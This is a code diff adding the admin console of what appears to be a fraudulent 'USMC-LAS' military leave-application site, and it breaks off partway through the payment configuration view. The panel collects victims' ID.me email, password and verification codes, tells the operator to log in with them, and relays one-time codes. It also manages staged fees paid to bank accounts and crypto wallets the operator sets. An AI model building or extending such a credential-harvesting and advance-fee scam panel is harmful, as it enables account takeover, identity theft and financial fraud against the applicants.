@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>USMC-LAS Admin Console</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Oswald:wght@500;700&display=swap');
+    :root{--primary:#0b3d91;--primary-dark:#082d6b;--accent:#c8102e;--bg:#f0f4f8;--card:#fff;--text:#1a1a1a;--muted:#6b7280;--border:#d1d5db;--success:#16a34a;--warning:#d97706;--danger:#dc2626;--info:#2563eb;--shadow:0 4px 6px -1px rgba(0,0,0,.1)}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+    .login-screen{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#0b3d91,#1a4fa0)}
+    .login-box{background:var(--card);padding:3rem;border-radius:16px;box-shadow:0 10px 25px rgba(0,0,0,.1);width:100%;max-width:420px}
+    .login-box h1{font-family:'Oswald',sans-serif;color:var(--primary);text-transform:uppercase;text-align:center;margin-bottom:.5rem;font-size:1.8rem}
+    .login-box .sub{text-align:center;color:var(--muted);margin-bottom:2rem;font-size:.9rem}
+    .fg{margin-bottom:1.25rem}
+    .fg label{display:block;font-weight:600;margin-bottom:.4rem;color:var(--primary);font-size:.9rem}
+    .fi{width:100%;padding:.7rem 1rem;border:1px solid var(--border);border-radius:8px;font-size:.95rem;font-family:'Inter',sans-serif;transition:border-color .2s}
+    .fi:focus{outline:none;border-color:var(--primary);box-shadow:0 0 0 3px rgba(11,61,145,.15)}
+    .btn{padding:.7rem 1.5rem;border:none;border-radius:8px;font-weight:600;font-size:.95rem;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:.5rem;font-family:'Inter',sans-serif}
+    .btn-p{background:var(--primary);color:#fff;width:100%;justify-content:center}
+    .btn-p:hover{background:var(--primary-dark)}
+    .btn-s{background:var(--success);color:#fff}.btn-s:hover{background:#15803d}
+    .btn-d{background:var(--danger);color:#fff}.btn-d:hover{background:#b91c1c}
+    .btn-o{background:transparent;color:var(--primary);border:1px solid var(--primary)}.btn-o:hover{background:rgba(11,61,145,.05)}
+    .btn-sm{padding:.4rem .8rem;font-size:.8rem}
+    .err{color:var(--danger);font-size:.85rem;margin-top:.5rem;text-align:center}
+    .admin-layout{display:flex;min-height:100vh}
+    .sidebar{width:260px;background:var(--primary);color:#fff;padding:1.5rem 0;position:fixed;top:0;left:0;bottom:0;overflow-y:auto}
+    .sidebar-hdr{padding:0 1.5rem 1.5rem;border-bottom:1px solid rgba(255,255,255,.15)}
+    .sidebar-hdr h2{font-family:'Oswald',sans-serif;text-transform:uppercase;font-size:1.3rem;letter-spacing:1px}
+    .sidebar-hdr p{font-size:.75rem;opacity:.7;margin-top:.25rem}
+    .sidebar-nav{padding:1rem 0}
+    .sidebar-nav a{display:flex;align-items:center;gap:.75rem;padding:.75rem 1.5rem;color:rgba(255,255,255,.8);text-decoration:none;font-size:.9rem;transition:all .2s;cursor:pointer}
+    .sidebar-nav a:hover,.sidebar-nav a.active{background:rgba(255,255,255,.1);color:#fff}
+    .sidebar-nav a .badge{background:var(--accent);color:#fff;border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:.7rem;margin-left:auto}
+    .sidebar-footer{padding:1rem 1.5rem;border-top:1px solid rgba(255,255,255,.15);position:absolute;bottom:0;width:100%}
+    .sidebar-footer a{color:rgba(255,255,255,.7);text-decoration:none;font-size:.85rem;cursor:pointer;display:flex;align-items:center;gap:.5rem}
+    .sidebar-footer a:hover{color:#fff}
+    .main{margin-left:260px;flex:1;padding:2rem}
+    .page-hdr{margin-bottom:2rem}
+    .page-hdr h1{font-family:'Oswald',sans-serif;color:var(--primary);text-transform:uppercase;font-size:1.8rem}
+    .page-hdr p{color:var(--muted);margin-top:.25rem}
+    .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1.25rem;margin-bottom:2rem}
+    .sc{background:var(--card);padding:1.5rem;border-radius:12px;box-shadow:var(--shadow);border-left:4px solid var(--primary)}
+    .sc.w{border-left-color:var(--warning)}.sc.d{border-left-color:var(--danger)}.sc.s{border-left-color:var(--success)}.sc.i{border-left-color:var(--info)}
+    .sc h4{font-size:.85rem;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+    .sc .sv{font-size:2rem;font-weight:700;color:var(--primary);margin-top:.25rem}
+    .card{background:var(--card);border-radius:12px;box-shadow:var(--shadow);overflow:hidden;margin-bottom:1.5rem}
+    .card-hdr{padding:1.25rem 1.5rem;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+    .card-hdr h3{font-family:'Oswald',sans-serif;text-transform:uppercase;color:var(--primary);font-size:1.1rem}
+    .card-body{padding:1.5rem}
+    .tw{overflow-x:auto}
+    table{width:100%;border-collapse:collapse}
+    th,td{padding:.75rem 1rem;text-align:left;border-bottom:1px solid var(--border);font-size:.9rem}
+    th{background:#f9fafb;font-weight:600;color:var(--muted);text-transform:uppercase;font-size:.75rem;letter-spacing:.5px}
+    tr:hover{background:#f9fafb}
+    .badge{display:inline-flex;padding:.2rem .6rem;border-radius:50px;font-size:.75rem;font-weight:600;text-transform:uppercase;letter-spacing:.3px}
+    .badge-p{background:#fef3c7;color:#92400e}.badge-a{background:#dbeafe;color:#1e40af}.badge-ok{background:#d1fae5;color:#065f46}.badge-r{background:#fee2e2;color:#991b1b}
+    .ud{background:var(--card);border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,.1);padding:2rem;max-width:800px;margin:0 auto}
+    .ud-hdr{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:2rem;padding-bottom:1rem;border-bottom:2px solid var(--border)}
+    .ud-hdr h2{font-family:'Oswald',sans-serif;color:var(--primary);text-transform:uppercase;font-size:1.5rem}
+    .dg{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1.5rem}
+    .di label{font-size:.8rem;color:var(--muted);text-transform:uppercase;letter-spacing:.3px}
+    .di p{font-weight:500;margin-top:.2rem}
+    .aa{display:flex;gap:1rem;margin-top:1.5rem;padding-top:1.5rem;border-top:1px solid var(--border);flex-wrap:wrap}
+    .toast{position:fixed;top:1rem;right:1rem;background:var(--success);color:#fff;padding:1rem 1.5rem;border-radius:8px;box-shadow:0 10px 25px rgba(0,0,0,.1);z-index:9999;animation:slideIn .3s ease}
+    .toast.err{background:var(--danger)}
+    @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+    @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+    .spinner{animation:spin 1s linear infinite;display:inline-block}
+    @media(max-width:768px){.sidebar{width:100%;position:relative}.main{margin-left:0}.admin-layout{flex-direction:column}.dg{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
+  </style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+const API='http://localhost:3001/api';
+let tk=localStorage.getItem('adminTk'),page='dash',allUsers=[],dd=null;
+
+function toast(m,e=false){const t=document.createElement('div');t.className='toast'+(e?' err':'');t.textContent=m;document.body.appendChild(t);setTimeout(()=>t.remove(),3000)}
+
+async function api(ep,m='GET',b=null){
+  const o={method:m,headers:{'Content-Type':'application/json','Authorization':'Bearer '+tk}};
+  if(b)o.body=JSON.stringify(b);
+  const r=await fetch(`${API}${ep}`,o);const d=await r.json();
+  if(!r.ok)throw new Error(d.error||'Failed');return d;
+}
+
+function renderLogin(){
+  document.getElementById('app').innerHTML=`<div class="login-screen"><div class="login-box"><h1>USMC-LAS</h1><p class="sub">Administration Console</p><form id="lf"><div class="fg"><label>Email</label><input type="email" id="le" class="fi" placeholder="admin@usmc-las.gov" required/></div><div class="fg"><label>Password</label><input type="password" id="lp" class="fi" placeholder="Password" required/></div><div id="le2" class="err"></div><button type="submit" class="btn btn-p" style="margin-top:1rem">Sign In</button></form></div></div>`;
+  document.getElementById('lf').onsubmit=async e=>{e.preventDefault();try{const d=await api('/admin/login','POST',{email:document.getElementById('le').value,password:document.getElementById('lp').value});tk=d.token;localStorage.setItem('adminTk',tk);renderApp()}catch(err){document.getElementById('le2').textContent=err.message}};
+}
+
+function renderApp(){
+  document.getElementById('app').innerHTML=`<div class="admin-layout"><nav class="sidebar"><div class="sidebar-hdr"><h2>USMC-LAS Admin</h2><p>Administration Panel</p></div><div class="sidebar-nav"><a class="${page==='dash'?'active':''}" onclick="nav('dash')">Dashboard</a><a class="${page==='users'?'active':''}" onclick="nav('users')">All Applicants</a><a class="${page==='payments'?'active':''}" onclick="nav('payments')">Payment Approvals <span class="badge" id="pb">0</span></a><a class="${page==='idme'?'active':''}" onclick="nav('idme')">IDME Verification <span class="badge" id="ib">0</span></a><a class="${page==='idmeCodes'?'active':''}" onclick="nav('idmeCodes')">IDME Codes <span class="badge" id="icb">0</span></a><a class="${page==='clearance'?'active':''}" onclick="nav('clearance')">Clearance Payments <span class="badge" id="cb">0</span></a><a class="${page==='final'?'active':''}" onclick="nav('final')">Final Approvals</a><a class="${page==='payconfig'?'active':''}" onclick="nav('payconfig')">Payment Config</a></div><div class="sidebar-footer"><a onclick="logout()">Sign Out</a></div></nav><main class="main" id="mc"></main></div>`;
+  load();
+}
+
+function nav(p){page=p;renderApp()}
+function logout(){tk=null;localStorage.removeItem('adminTk');renderLogin()}
+
+async function load(){
+  try{dd=await api('/admin/dashboard');allUsers=dd.users;
+    document.getElementById('pb').textContent=dd.pendingPayments.length;
+    document.getElementById('ib').textContent=dd.pendingIdme.length;
+    document.getElementById('icb').textContent=dd.pendingIdmeCodes.length;
+    document.getElementById('cb').textContent=dd.pendingClearance.length;
+    ({dash:renderDash,users:renderUsers,payments:renderPayments,idme:renderIdme,idmeCodes:renderIdmeCodes,clearance:renderClearance,final:renderFinal,payconfig:renderPayConfig}[page]||renderDash)();
+  }catch(err){if(err.message.includes('Invalid')||err.message.includes('token'))logout();else document.getElementById('mc').innerHTML=`<p style="color:red">${err.message}</p>`}
+}
+
+function renderDash(){
+  const mc=document.getElementById('mc'),s=dd.stats;
+  mc.innerHTML=`<div class="page-hdr"><h1>Dashboard</h1><p>Overview of all leave applications</p></div><div class="stats"><div class="sc"><h4>Total Applicants</h4><div class="sv">${s.totalUsers}</div></div><div class="sc w"><h4>Pending Payments</h4><div class="sv">${s.pendingPayments}</div></div><div class="sc i"><h4>Pending IDME</h4><div class="sv">${s.pendingIdme+s.pendingIdmeCodes}</div></div><div class="sc"><h4>Pending Clearance</h4><div class="sv">${s.pendingClearance}</div></div><div class="sc s"><h4>Approved</h4><div class="sv">${s.approved}</div></div></div><div class="card"><div class="card-hdr"><h3>Recent Applicants</h3></div><div class="card-body"><div class="tw"><table><thead><tr><th>Name</th><th>Email</th><th>Stage</th><th>Status</th><th>Actions</th></tr></thead><tbody>${allUsers.slice(0,10).map(u=>`<tr><td><strong>${esc(u.fullName)}</strong></td><td>${esc(u.email)}</td><td>Stage ${u.currentStage}</td><td><span class="badge ${sb(u.stageStatus)}">${fs(u.stageStatus)}</span></td><td><button class="btn btn-o btn-sm" onclick="vu('${u.id}')">View</button></td></tr>`).join('')}${allUsers.length===0?'<tr><td colspan="5" style="text-align:center;color:var(--muted)">No applicants yet</td></tr>':''}</tbody></table></div></div></div>`;
+}
+
+function renderUsers(){
+  document.getElementById('mc').innerHTML=`<div class="page-hdr"><h1>All Applicants</h1><p>Manage and view all registered applicants</p></div><div style="display:flex;gap:1rem;margin-bottom:1.5rem;flex-wrap:wrap"><input type="text" id="si" class="fi" placeholder="Search by name or email..." oninput="fu()" style="max-width:300px"/><select id="sf" class="fi" onchange="fu()" style="max-width:200px"><option value="">All Stages</option>${[1,2,3,4,5,6,7,8].map(n=>`<option value="${n}">Stage ${n}</option>`).join('')}</select></div><div class="card"><div class="card-body"><div class="tw"><table><thead><tr><th>Name</th><th>Email</th><th>Applying</th><th>Stage</th><th>Status</th><th>Actions</th></tr></thead><tbody id="utb"></tbody></table></div></div></div>`;
+  rt(allUsers);
+}
+function rt(u){document.getElementById('utb').innerHTML=u.map(x=>`<tr><td><strong>${esc(x.fullName)}</strong></td><td>${esc(x.email)}${x.emailVerified?' <span class="badge badge-ok" style="font-size:.6rem">✓</span>':''}</td><td>${x.applyingFor==='self'?'Self':'Other'}</td><td>Stage ${x.currentStage}</td><td><span class="badge ${sb(x.stageStatus)}">${fs(x.stageStatus)}</span></td><td><button class="btn btn-o btn-sm" onclick="vu('${x.id}')">View</button><button class="btn btn-d btn-sm" onclick="du('${x.id}')" style="margin-left:.25rem">Del</button></td></tr>`).join('')}
+function fu(){const s=document.getElementById('si').value.toLowerCase(),f=document.getElementById('sf').value;rt(allUsers.filter(x=>(!s||x.fullName.toLowerCase().includes(s)||x.email.toLowerCase().includes(s))&&(!f||x.currentStage===parseInt(f))))}
+
+async function vu(uid){
+  try{
+    const d=await api(`/admin/users/${uid}`);const u=d.user;page='vu';
+    document.getElementById('mc').innerHTML=`<div class="ud"><div class="ud-hdr"><div><h2>${esc(u.fullName)}</h2><p style="color:var(--muted)">${esc(u.email)} | @${esc(u.username)}</p></div><button class="btn btn-o" onclick="nav('users')">Back</button></div><div class="dg"><div class="di"><label>Full Name</label><p>${esc(u.fullName||'-')}</p></div><div class="di"><label>Email</label><p>${esc(u.email)}</p></div><div class="di"><label>Username</label><p>${esc(u.username)}</p></div><div class="di"><label>DOB</label><p>${u.dob||'-'}</p></div><div class="di"><label>Address</label><p>${[u.address,u.city,u.state,u.zipCode].filter(Boolean).join(', ')||'-'}</p></div><div class="di"><label>Applying For</label><p>${u.applyingFor==='self'?'Self':'Another'}</p></div><div class="di"><label>Office</label><p>${u.selectedOffice||'Not selected'}</p></div><div class="di"><label>Stage</label><p>Stage ${u.currentStage}</p></div><div class="di"><label>Status</label><p><span class="badge ${sb(u.stageStatus)}">${fs(u.stageStatus)}</span></p></div><div class="di"><label>Account Officer</label><p>${u.accountOfficer||'Not assigned'}</p></div><div class="di"><label>Applied</label><p>${new Date(u.createdAt).toLocaleDateString()}</p></div></div><h3 style="font-family:'Oswald',sans-serif;color:var(--primary);text-transform:uppercase;margin:1.5rem 0 1rem;border-bottom:1px solid var(--border);padding-bottom:.5rem">Verification Status</h3><div class="dg"><div class="di"><label>Email Verified</label><p>${u.emailVerified?'<span class="badge badge-ok">Verified</span>':'<span class="badge badge-r">Not Verified</span>'}</p></div><div class="di"><label>Bio Data</label><p>${u.bioDataComplete?'<span class="badge badge-ok">Complete</span>':'<span class="badge badge-p">Incomplete</span>'}</p></div><div class="di"><label>Office</label><p>${u.officeSelected?'<span class="badge badge-ok">Selected</span>':'<span class="badge badge-p">Pending</span>'}</p></div><div class="di"><label>App Fee</label><p>${u.applicationFeeVerified?'<span class="badge badge-ok">Verified</span>':'<span class="badge badge-p">Pending</span>'}</p></div><div class="di"><label>IDME Status</label><p>${idmeBadge(u)}</p></div><div class="di"><label>IDME Verified</label><p>${u.idmeVerified?'<span class="badge badge-ok">Verified</span>':'<span class="badge badge-p">Pending</span>'}</p></div><div class="di"><label>Clearance</label><p>${u.clearanceDuration?u.clearanceDuration+'mo - $'+u.clearanceFee?.toFixed(2):'-'}</p></div><div class="di"><label>Clearance Pay</label><p>${u.clearancePaymentVerified?'<span class="badge badge-ok">Verified</span>':'<span class="badge badge-p">Pending</span>'}</p></div><div class="di"><label>Final</label><p>${u.finalApproved?'<span class="badge badge-ok">Approved</span>':'<span class="badge badge-p">Pending</span>'}</p></div></div>${!u.emailVerified?`<div style="background:#f9fafb;padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid var(--border)"><p style="font-size:.85rem;color:var(--muted);margin-bottom:.75rem"><strong>Manual Verification Relay</strong> - Send verification code to the applicant</p><div style="display:flex;gap:1rem;flex-wrap:wrap"><button class="btn btn-o btn-sm" onclick="sendEmailCode('${u.id}')">Send Email Code</button></div></div>`:''}${u.idmeEmail?`<div style="background:#f9fafb;padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid var(--border)"><p style="font-size:.85rem;color:var(--muted)"><strong>IDME Email:</strong> ${esc(u.idmeEmail)}<br/><strong>IDME Password:</strong> <span style="letter-spacing:2px">${'*'.repeat(u.idmePassword?.length||0)}</span>${u.idmeCode?`<br/><strong>User Code:</strong> <span style="color:var(--primary);font-weight:700;font-size:1.1rem">${u.idmeCode}</span>`:''}</p></div>`:''}<div class="aa" id="aa"></div></div>`;
+    ra(u);
+  }catch(err){toast(err.message,true)}
+}
+
+function idmeBadge(u){
+  const m={sending:'badge-a',awaiting_code:'badge-a',code_sending:'badge-a',declined:'badge-r',verified:'badge-ok',none:'badge-p'};
+  return`<span class="badge ${m[u.idmeStatus]||'badge-p'}">${fs(u.idmeStatus||'none')}</span>`;
+}
+
+function ra(u){
+  const el=document.getElementById('aa');let h='';
+  if(u.stageStatus==='awaiting_payment_verification'){
+    h=`<div style="width:100%"><div class="fg"><label style="font-weight:600;font-size:.85rem;color:var(--primary)">Assign Account Officer</label><input type="text" class="fi" id="on" placeholder="Officer name"/></div><div style="display:flex;gap:1rem"><button class="btn btn-s" onclick="ap('${u.id}',true)">Approve Payment</button><button class="btn btn-d" onclick="ap('${u.id}',false)">Reject</button></div></div>`;
+  }else if(u.stageStatus==='awaiting_idme_verification'||u.idmeStatus==='sending'){
+    h=`<div style="width:100%"><p style="margin-bottom:1rem;color:var(--muted)">Review the submitted IDME credentials. Try logging in with the credentials below.</p><div style="display:flex;gap:1rem"><button class="btn btn-s" onclick="idmeOk('${u.id}')">Credentials Correct</button><button class="btn btn-d" onclick="idmeBad('${u.id}')">Credentials Wrong</button></div></div>`;
+  }else if(u.idmeStatus==='awaiting_code'||u.idmeStatus==='code_sending'){
+    h=`<div style="width:100%"><p style="margin-bottom:1rem;color:var(--muted)">The user submitted code: <strong style="font-size:1.2rem;color:var(--primary)">${u.idmeCode||'-'}</strong>. Verify this matches the IDME code.</p><div style="display:flex;gap:1rem"><button class="btn btn-s" onclick="idmeCodeOk('${u.id}')">Code Correct</button><button class="btn btn-d" onclick="idmeCodeBad('${u.id}')">Code Wrong</button></div></div>`;
+  }else if(u.stageStatus==='awaiting_clearance_verification'){
+    h=`<div style="width:100%"><p style="margin-bottom:1rem;color:var(--muted)">Review clearance payment of <strong>$${u.clearanceFee?.toFixed(2)||'0.00'}</strong> for ${u.clearanceDuration}mo leave.</p><div style="display:flex;gap:1rem"><button class="btn btn-s" onclick="ac('${u.id}',true)">Approve</button><button class="btn btn-d" onclick="ac('${u.id}',false)">Reject</button></div></div>`;
+  }else if(u.stageStatus==='awaiting_final_approval'){
+    h=`<div style="width:100%"><p style="margin-bottom:1rem;color:var(--muted)">All verifications complete. Ready to issue leave authorization.</p><div style="display:flex;gap:1rem"><button class="btn btn-s" onclick="af('${u.id}',true)">Approve Leave</button><button class="btn btn-d" onclick="af('${u.id}',false)">Reject</button></div></div>`;
+  }
+  el.innerHTML=h;
+}
+
+function renderPayments(){
+  const mc=document.getElementById('mc'),p=dd.pendingPayments;
+  mc.innerHTML=`<div class="page-hdr"><h1>Payment Approvals</h1><p>Review application fee payments</p></div><div class="card"><div class="card-body"><div class="tw"><table><thead><tr><th>User ID</th><th>Receipt</th><th>Submitted</th><th>Actions</th></tr></thead><tbody>${p.map(x=>`<tr><td>${x.userId.slice(0,8)}...</td><td>${esc(x.receiptNumber)}</td><td>${new Date(x.submittedAt).toLocaleDateString()}</td><td><button class="btn btn-s btn-sm" onclick="ap('${x.userId}',true)">Approve</button><button class="btn btn-d btn-sm" onclick="ap('${x.userId}',false)" style="margin-left:.25rem">Reject</button></td></tr>`).join('')}${p.length===0?'<tr><td colspan="4" style="text-align:center;color:var(--muted)">No pending payments</td></tr>':''}</tbody></table></div></div></div>`;
+}
+
+function renderIdme(){
+  const mc=document.getElementById('mc'),p=dd.pendingIdme;
+  mc.innerHTML=`<div class="page-hdr"><h1>IDME Verification</h1><p>User IDME credentials pending review</p></div><div class="card"><div class="card-body"><div class="tw"><table><thead><tr><th>User</th><th>Submitted</th><th>Actions</th></tr></thead><tbody>${p.map(x=>{const u=allUsers.find(a=>a.id===x.userId);return`<tr><td><strong>${esc(u?.fullName||'Unknown')}</strong></td><td>${new Date(x.submittedAt).toLocaleDateString()}</td><td><button class="btn btn-o btn-sm" onclick="vu('${x.userId}')">Review & Approve</button></td></tr>`}).join('')}${p.length===0?'<tr><td colspan="3" style="text-align:center;color:var(--muted)">No pending IDME verifications</td></tr>':''}</tbody></table></div></div></div>`;
+}
+
+function renderIdmeCodes(){
+  const mc=document.getElementById('mc'),p=dd.pendingIdmeCodes;
+  mc.innerHTML=`<div class="page-hdr"><h1>IDME Code Verification</h1><p>User verification codes pending confirmation</p></div><div class="card"><div class="card-body"><div class="tw"><table><thead><tr><th>User</th><th>Code</th><th>Submitted</th><th>Actions</th></tr></thead><tbody>${p.map(x=>{const u=allUsers.find(a=>a.id===x.userId);return`<tr><td><strong>${esc(u?.fullName||'Unknown')}</strong></td><td style="font-size:1.2rem;font-weight:700;color:var(--primary);letter-spacing:2px">${x.code}</td><td>${new Date(x.submittedAt).toLocaleDateString()}</td><td><button class="btn btn-o btn-sm" onclick="vu('${x.userId}')">Review & Approve</button></td></tr>`}).join('')}${p.length===0?'<tr><td colspan="4" style="text-align:center;color:var(--muted)">No pending codes</td></tr>':''}</tbody></table></div></div></div>`;
+}
+
+function renderClearance(){
+  const mc=document.getElementById('mc'),p=dd.pendingClearance;
+  mc.innerHTML=`<div class="page-hdr"><h1>Clearance Payments</h1><p>Review clearance fee payments</p></div><div class="card"><div class="card-body"><div class="tw"><table><thead><tr><th>User</th><th>Fee</th><th>Duration</th><th>Submitted</th><th>Actions</th></tr></thead><tbody>${p.map(x=>{const u=allUsers.find(a=>a.id===x.userId);return`<tr><td><strong>${esc(u?.fullName||'Unknown')}</strong></td><td>$${(x.clearanceFee||0).toFixed(2)}</td><td>${x.duration}mo</td><td>${new Date(x.submittedAt).toLocaleDateString()}</td><td><button class="btn btn-s btn-sm" onclick="ac('${x.userId}',true)">Approve</button><button class="btn btn-d btn-sm" onclick="ac('${x.userId}',false)" style="margin-left:.25rem">Reject</button></td></tr>`}).join('')}${p.length===0?'<tr><td colspan="5" style="text-align:center;color:var(--muted)">No pending clearance</td></tr>':''}</tbody></table></div></div></div>`;
+}
+
+function renderFinal(){
+  const mc=document.getElementById('mc'),fp=allUsers.filter(u=>u.stageStatus==='awaiting_final_approval');
+  mc.innerHTML=`<div class="page-hdr"><h1>Final Approvals</h1><p>Issue leave authorization</p></div><div class="card"><div class="card-body"><div class="tw"><table><thead><tr><th>Name</th><th>Office</th><th>Duration</th><th>Fee</th><th>Actions</th></tr></thead><tbody>${fp.map(u=>`<tr><td><strong>${esc(u.fullName)}</strong></td><td>${u.selectedOffice||'-'}</td><td>${u.clearanceDuration||'-'}mo</td><td>$${(u.clearanceFee||0).toFixed(2)}</td><td><button class="btn btn-o btn-sm" onclick="vu('${u.id}')">Review & Approve</button></td></tr>`).join('')}${fp.length===0?'<tr><td colspan="5" style="text-align:center;color:var(--muted)">No pending final approvals</td></tr>':''}</tbody></table></div></div></div>`;
+}
+
+async function ap(uid,ok){
+  try{const on=document.getElementById('on')?.value||'';await api(`/admin/approve-payment/${uid}`,'POST',{approved:ok,officerName:on});toast(ok?'Payment approved':'Payment rejected');dd=await api('/admin/dashboard');allUsers=dd.users;ok?vu(uid):load()}catch(e){toast(e.message,true)}
+}
+async function idmeOk(uid){
+  try{await api(`/admin/idme-approve-credentials/${uid}`,'POST',{correct:true});toast('Credentials verified - code sent to user');dd=await api('/admin/dashboard');allUsers=dd.users;vu(uid)}catch(e){toast(e.message,true)}
+}
+async function idmeBad(uid){
+  const msg=prompt('Enter decline reason (e.g. wrong password):');if(msg===null)return;
+  try{await api(`/admin/idme-approve-credentials/${uid}`,'POST',{correct:false,message:msg});toast('Credentials declined');dd=await api('/admin/dashboard');allUsers=dd.users;vu(uid)}catch(e){toast(e.message,true)}
+}
+async function idmeCodeOk(uid){
+  try{await api(`/admin/idme-approve-code/${uid}`,'POST',{approved:true});toast('IDME fully verified!');dd=await api('/admin/dashboard');allUsers=dd.users;vu(uid)}catch(e){toast(e.message,true)}
+}
+async function idmeCodeBad(uid){
+  try{await api(`/admin/idme-approve-code/${uid}`,'POST',{approved:false});toast('Code rejected');dd=await api('/admin/dashboard');allUsers=dd.users;vu(uid)}catch(e){toast(e.message,true)}
+}
+async function ac(uid,ok){
+  try{await api(`/admin/approve-clearance/${uid}`,'POST',{approved:ok});toast(ok?'Clearance approved':'Clearance rejected');dd=await api('/admin/dashboard');allUsers=dd.users;ok?vu(uid):load()}catch(e){toast(e.message,true)}
+}
+async function af(uid,ok){
+  try{await api(`/admin/approve-final/${uid}`,'POST',{approved:ok});toast(ok?'Leave approved!':'Rejected');dd=await api('/admin/dashboard');allUsers=dd.users;vu(uid)}catch(e){toast(e.message,true)}
+}
+async function du(uid){
+  if(!confirm('Delete this applicant?'))return;
+  try{await api(`/admin/users/${uid}`,'DELETE');toast('Deleted');dd=await api('/admin/dashboard');allUsers=dd.users;load()}catch(e){toast(e.message,true)}
+}
+async function sendEmailCode(uid){
+  try{await api(`/admin/send-email-verification/${uid}`,'POST');toast('Verification code sent to email');dd=await api('/admin/dashboard');allUsers=dd.users;vu(uid)}catch(e){toast(e.message,true)}
+}
+
+function sb(s){return{active:'badge-a',awaiting_payment_verification:'badge-p',idme_pending:'badge-a',awaiting_idme_verification:'badge-p',sending:'badge-a',awaiting_code:'badge-a',code_sending:'badge-a',declined:'badge-r',clearance_pending:'badge-a',pending_clearance_payment:'badge-p',awaiting_clearance_verification:'badge-p',awaiting_final_approval:'badge-a',approved:'badge-ok',rejected:'badge-r',payment_rejected:'badge-r',idme_rejected:'badge-r',clearance_rejected:'badge-r',verified:'badge-ok',none:'badge-p'}[s]||'badge-p'}
+function fs(s){return(s||'').replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase())}
+function esc(s){const d=document.createElement('div');d.textContent=s||'';return d.innerHTML}
+
+let payCfg={};
+async function loadPayConfig(){try{const d=await api('/admin/payment-config');payCfg=d.config||{}}catch{}}
+async function savePayConfig(){
+  const bankTransfer={available:document.getElementById('bt_avail')?.checked||false,bankName:document.getElementById('bt_bank')?.value||'',accountName:document.getElementById('bt_acct')?.value||'',accountNumber:document.getElementById('bt_num')?.value||'',routingNumber:document.getElementById('bt_routing')?.value||'',swiftCode:document.getElementById('bt_swift')?.value||'',instructions:document.getElementById('bt_inst')?.value||''};
+  const crypto={available:document.getElementById('cr_avail')?.checked||false,walletAddress:document.getElementById('cr_addr')?.value||'',qrCodeImage:document.getElementById('cr_qr_data')?.value||'',network:document.getElementById('cr_net')?.value||'BTC',instructions:document.getElementById('cr_inst')?.value||''};
+  try{await api('/admin/payment-config','POST',{bankTransfer,crypto});toast('Payment config saved');await loadPayConfig();renderPayConfig()}catch(e){toast(e.message,true)}
+}
+async function previewQR(){
+  const f=document.getElementById('cr_qr_file');if(!f||!f.files[0])return;
+  const r=new FileReader();r.onload=e=>{document.getElementById('cr_qr_data').value=e.target.result;document.getElementById('cr_qr_preview').src=e.target.result;document.getElementById('cr_qr_preview').style.display='block'};r.readAsDataURL(f.files[0]);
+}
+async function renderPayConfig(){
+  await loadPayConfig();const b=payCfg.bankTransfer||{},c=payCfg.crypto||{};
+  document.getElementById('mc').innerHTML=`<div class="page-hdr"><h1>Payment Configuration</h1><p>Configure available payment methods for applicants</p></div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem">
+  <div class="card"><div class="card-hdr"><h3>Bank Transfer</h3><label style="display:flex;align-items:center;gap:.5rem;cursor:pointer"><input type="checkbox" id="bt_avail" ${b.available?'checked':''} style="width:18px;height:18px"/> <span style="font-size:.85rem;font-weight:600">Available</span></label></div><div class="card-body">
+  <div class="fg"><label>Bank Name</label><input type="text" class="fi" id="bt_bank" value="${esc(b.bankName||'')}" placeholder="e.g. Chase Bank"/></div>
+  <div class="fg"><label>Account Name</label><input type="text" class="fi" id="bt_acct" value="${esc(b.accountName||'')}" placeholder="Account holder name"/></div>
+  <div class="fg"><label>Account Number</label><input type="text" class="fi" id="bt_num" value="${esc(b.accountNumber||'')}" placeholder="Account number"/></div>
+  <div class="fg"><label>Routing Number</label><input type="text" class="fi" id="bt_routing" value="${esc(b.routingNumber||'')}" placeholder="Routing number"/></div>
+  <div class="fg"><label>SWIFT Code</label><input type="text" class="fi" id="bt_swift" value="${esc(b.swiftCode||'')}" placeholder="Optional"/></div>
+  <div class="fg"><label>Instructions</label><textarea class="fi" id="bt_inst" rows="3" placeholder="Payment instructions for applicants">${esc(b.instructions||'')}</textarea></div>
+  </div></div>
+  <div class="card"><div class="card-hdr"><h3>Crypto (BTC)</h3><label style="display:flex;align-items:center;gap:.5rem;cursor:pointer"><input type="checkbox" id="cr_avail" ${c.available?'checked':''} style="width:18px;height:18px"/> <span style="font-size:.85rem;font-weight:600">Available</span></label></div><div class="card-body">
+  <div class="fg"><label>Network</label><select class="fi" id="cr_net"><option value="BTC" ${c.network==='BTC'?'selected':''}>Bitcoin (BTC)</option><option value="ETH" ${c.network==='ETH'?'selected':''}>Ethereum (ETH)</option><option value="USDT" ${c.network==='USDT'?'selected':''}>Tether (USDT)</option></select></div>
+  <div class="fg"><label>Wallet Address</label><input type="text" class="fi" id="cr_addr" value="${esc(c.walletAddress||'')}" placeholder="Bitcoin wallet address" style="font-family:monospace"/></div>
